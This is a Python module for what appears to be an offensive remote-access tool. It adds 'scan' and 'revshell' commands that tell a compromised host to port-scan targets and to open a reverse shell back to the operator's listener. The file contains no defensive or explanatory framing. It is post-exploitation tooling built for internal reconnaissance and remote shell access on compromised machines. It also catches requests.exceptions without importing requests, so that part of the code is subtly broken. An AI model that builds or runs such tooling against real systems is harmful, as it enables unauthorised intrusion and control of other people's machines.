from .base_module import BaseModule
from rich.panel import Panel

class Module(BaseModule):
    @property
    def commands(self) -> list[str]:
        return ["scan", "revshell"]

    def get_help(self) -> dict:
        return {
            "scan": ("<host> <ports>", "Perform a TCP port scan from the remote host (e.g., 22,80 or 22-80)."),
            "revshell": ("<lhost> <lport>", "Initiate a reverse shell to your listener.")
        }

    def execute(self, args: list[str]):
        cmd = args.pop(0)
        if cmd == "scan": self._handle_scan(args)
        elif cmd == "revshell": self._handle_revshell(args)

    def _handle_scan(self, args: list[str]):
        if len(args) < 2: return self.console.print("[red]Usage: scan <host> <ports>[/red]")
        target, ports = args[0], args[1]
        payload = {'action': 'scan', 'host': target, 'ports': ports}

        with self.console.status(f"[yellow]Scanning {target}...", spinner="bouncingBar"):
            data = self.conn.send_request(payload, timeout=180)

        if data.get('status') == 'success':
            open_ports = data.get('open_ports', [])
            if open_ports:
                self.console.print(Panel(f"[green]Open ports:[/green] [bold yellow]{', '.join(map(str, open_ports))}[/bold yellow]", title=f"Scan Results for {target}"))
            else:
                self.console.print(f"[yellow]No open ports found on {target}.[/yellow]")
        else:
            self.console.print(f"[red]Scan failed: {data.get('message')}[/red]")

    def _handle_revshell(self, args: list[str]):
        if len(args) != 2: return self.console.print("[red]Usage: revshell <your_listen_ip> <your_listen_port>[/red]")
        host, port = args
        self.console.print(f"[cyan]Attempting to connect back to {host}:{port}...[/cyan]")
        self.console.print("[yellow]Ensure your listener is running (`python buri_v11.py listen ...`)[/yellow]")

        payload = {'action': 'reverse_shell', 'host': host, 'port': port}
        # Send async-like; we don't expect a normal response if it succeeds
        try:
            self.conn.send_request(payload, timeout=5)
        except requests.exceptions.ReadTimeout:
            self.console.print("[green]Request sent. If the shell connects, you won't see a response here.[/green]")
        except Exception as e:
            self.console.print(f"[red]Error sending revshell command: {e}[/red]")